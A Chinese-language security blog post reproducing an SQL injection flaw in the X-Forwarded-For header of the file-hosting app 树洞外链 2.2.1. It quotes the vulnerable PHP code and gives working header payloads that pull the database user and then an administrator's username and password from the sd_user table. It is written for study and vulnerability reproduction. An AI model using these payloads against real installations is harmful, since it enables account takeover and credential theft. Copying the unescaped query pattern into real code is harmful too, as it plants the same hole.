---
title: 树洞外链X_FORWARDED_FOR注入漏洞复现
date: 2019-07-25 14:20:00
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 漏洞复现
    - 树洞外链
---
# 一、漏洞概述
树洞外链现在已经停止更新，作者又开发了[Cloudreve](https://github.com/cloudreve/Cloudreve)，有兴趣可以了解一下。
回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。
树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。

***

# 二、漏洞分析

在`/includes/function.php`的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 
```
function get_real_ip(){
$ip=false;
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
$ip = $_SERVER["HTTP_CLIENT_IP"];
}
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
for ($i = 0; $i < count($ips); $i++) {
if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
$ip = $ips[$i];
break;
}
}
}
return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
```

然后在`includes/save.php`  20行左右发现调用`get_real_ip()`函数

```
$ip=get_real_ip();
$dd=date('Y-m-d H:i:s');
$rand = md5(time() . mt_rand(0,1000));
$stmt = $con->prepare("INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, '$rand', '$ip', '$dd', '0' , '$uploadUser', '$policyId');");

$stmt->bind_param('s', $ming);
```

***

# 三、漏洞复现

下载树洞外链源码，本地搭建环境。
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png)

注册账号登陆，然后打开burpsuite，关掉拦截
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png)

然后上传文件，在HTTP history里找到`/includes/save.php`,发送到Repeater
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png)

构造payload并发送(UID改成自己的用户ID，个人详情里面可以查看)

```
X-Forwarded-For: 1.1.1.1',user(),'0',UID,UID); #

ming=aa
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png)

然后在**我的文件**里面可以看到执行结果
![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png)


爆用户名: 
`X-Forwarded-For: 1.1.1.1′,(select username from sd_user where id=1),’0′,uid,uid); # `

爆密码: 
`X-Forwarded-For: 1.1.1.1′,(select pwdfrom sd_user where id=1),’0′,uid,uid); #`

***
# 参考文章
[代码审计树洞X_FORWARDED_FOR注入](https://www.freebuf.com/column/179363.html)
[代码审计之头部注入X-Forwarded-For](https://blog.csdn.net/qq_21510303/article/details/91886405)